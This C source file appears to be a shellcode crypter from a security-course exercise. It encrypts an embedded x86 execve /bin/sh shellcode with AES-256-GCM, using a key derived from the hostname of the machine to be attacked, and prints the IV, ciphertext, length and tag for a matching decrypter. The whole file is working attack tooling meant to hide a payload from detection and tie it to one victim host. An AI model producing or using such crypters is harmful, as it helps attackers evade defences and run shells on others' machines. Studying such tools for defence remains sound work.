/*
  Author: Kevin Kirsche
  Date: August 30, 2018
  Compile: gcc -o encrypt encrypt.c -lcrypto -lssl
  Requires package (debian / ubuntu): openssl libssl-dev
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <openssl/rand.h>
#include <openssl/evp.h>

void handleErrors()
{
  printf("Some error occured\n");
}

int encrypt(unsigned char *shellcode, int shellcode_len,
  unsigned char *key, unsigned char *iv,
  unsigned char *ciphertext, unsigned char *tag)
{
  EVP_CIPHER_CTX *ctx;

  int len=0, ciphertext_len=0;

  /* Create and initialize the encryption envelop context */
  if(!(ctx = EVP_CIPHER_CTX_new()))
    handleErrors();

  /* Initialize the AES-256-GCM encryption operation. */
  if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL))
    handleErrors();

  /* Set IV length if default 12 bytes (96 bits) is not appropriate */
  if(1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 16, NULL))
    handleErrors();

  /* Initialize our encryption key and IV */
  if(1 != EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv)) handleErrors();

  /* Provide the message to be encrypted, and obtain the encrypted output.
   * EVP_EncryptUpdate can be called multiple times if necessary
   */
  /* encrypt in block lengths of 16 bytes */
   while(ciphertext_len<=shellcode_len-16)
   {
    if(1 != EVP_EncryptUpdate(ctx, ciphertext+ciphertext_len, &len, shellcode+ciphertext_len, 16))
      handleErrors();
    ciphertext_len+=len;
   }
   if(1 != EVP_EncryptUpdate(ctx, ciphertext+ciphertext_len, &len, shellcode+ciphertext_len, shellcode_len-ciphertext_len))
    handleErrors();
   ciphertext_len+=len;

  /* Finalize the encryption. Normally ciphertext bytes may be written at
   * this stage, but this does not occur in GCM mode
   */
  if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + ciphertext_len, &len)) handleErrors();
  ciphertext_len += len;

  /* Get the tag */
  if(1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag))
    handleErrors();

  /* Clean up */
  EVP_CIPHER_CTX_free(ctx);

  return ciphertext_len;
}

int main (int argc, char **argv)
{
  // Change the shellcode for your purposes. Below is a stack-based execve shellcode from earlier exercises.
  // Be careful with null bytes, they may terminate your shellcode early!
  unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
  // Do not change below this line!!
  unsigned char key[32],ciphertext[1024+EVP_MAX_BLOCK_LENGTH],tag[16];
  unsigned char iv[16];
  int k;
  int counter;

  printf("Enter the hostname where shellcode will execute: ");
  scanf("%s", key);
  printf("Key:\n%s\n\n", key);

  /* generate encryption key from the hostname we want to attack */
  if(!PKCS5_PBKDF2_HMAC_SHA1(key, strlen(key),NULL,0,1000,32,key))
  {
    printf("Error in key generation\n");
    exit(1);
  }

  /* generate random IV */
  while(!RAND_bytes(iv,sizeof(iv)));

  /* encrypt the text */
  k = encrypt(shellcode, strlen(shellcode), key, iv, ciphertext, tag);

  /* print the IV to be used in the decrypter */
  printf("unsigned char iv[] = \"");
  for (counter=0; counter < sizeof(iv); counter++) {
    printf("\\x%02x", iv[counter]);
  }
  printf("\";\n");

  /* print the encrypted shellcode to be used in the decrypter */
  printf("unsigned char encrypted_shellcode[] = \"");
  for (counter=0; counter < k; counter++) {
    printf("\\x%02x", ciphertext[counter]);
  }
  printf("\";\n");

  /* print the encrypted shellcode length to be used in the decrypter */
  printf("int encrypted_shellcode_len = %d;\n", k);

  /* print the GCM tag (aka the message authentication code) to be used in the decrypter */
  printf("unsigned char tag[] = \"");
  for (counter=0; counter < sizeof(tag); counter++) {
    printf("\\x%02x", tag[counter]);
  }

  printf("\";\n");
  return 0;
}
